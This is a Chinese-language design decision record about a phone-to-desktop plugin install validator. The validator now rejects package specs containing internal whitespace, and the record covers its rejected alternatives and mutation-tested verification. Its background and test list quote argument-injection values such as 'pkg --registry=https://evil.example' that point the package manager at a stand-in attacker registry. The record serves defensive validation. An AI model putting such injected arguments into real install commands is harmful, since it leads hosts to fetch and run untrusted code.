# 手机上收的 spec 只看形状，形状里本来就没有空白

- 日期：2026-11-04
- 触发：评审——`installableFromPhone` 的 `trim()` 只管两头，内部空白放行
- 状态：implemented

## 背景

`plugin.install` 是手机唯一能把任意字符串送进电脑侧包管理器的入口。那条判据只管"形状"
（不收本地路径、盘符、UNC、`file:`、`-` 开头），并明确把"能不能装"留给宿主。
但它漏了一类：**内部空白**。

```
spec.trim() 对 'pkg --registry=https://evil.example' 什么都没做 → 放行
```

这个串在形状上不是包名、也不是 git 地址。它是不是真的能注入，取决于宿主把 spec
怎么交给 pnpm —— 而那一步**本仓查不到**（`plugin-install.ts` 头注引用的是宿主
`installBundle` 的注释，不是它的实现）。于是它既是形状上的漏判、又不能靠推理定级。

## 决定

内部出现任何空白（空格 / tab / 换行）一律拒；错误文案从
「不收本机路径」扩成「不收本机路径或带空白的写法」（旧断言 `includes('不收本机路径')` 仍成立）。

## 被否掉的

- **顺带黑名单 shell 元字符**（`;` `|` `&` `$` 反引号）：没有证据说明宿主怎么调用 pnpm
  （按本仓纪律，查不到只能写「未找到」，禁止猜）。写一份自己都不确定完整性的黑名单，
  给的是"已经防住了"的假安全感。
- **只拒空格，不拒 tab / 换行**：`\s` 一次覆盖，没有额外代价。
- **在 `handlers.ts` 里各写一次**：判据只能有一处（`installableFromPhone`）。
- **改成"规范化"（把空白替掉）**：那等于替用户猜一个包名。形状不对就照实拒。

## 代价

本地带空格的路径也一并拒掉 —— 但"本地路径"这一整类本来就拒，它的子集不会损失能力。

顺带修掉一处**用例喂了线上不存在的形状**：`plugin-install.test.ts` 的「宿主抛错」那条
原来拿 `'bad spec'`（带空格）当载体，形状闸前移之后就挡在分发之前了。改用合法 spec
`dsh-plugin-demo`，那条用例的本意（宿主抛错怎么过线）不变。

## 验证

- 新增三条坏形状：`pkg --registry=https://evil.example`、`a\tb`、`git+https://x/y.git --force`。
- 变异校验：注释掉 `\s` 那一行 → **恰好 1 条红**
  （`pkg --registry=https://evil.example 不该放行`），其余 8 条全绿；还原 → 全绿。
- `connector`：`tsc --noEmit` 0、`pnpm test` **845** 条（844 绿 + 1 跳过，跳过的是跨语言用例）。
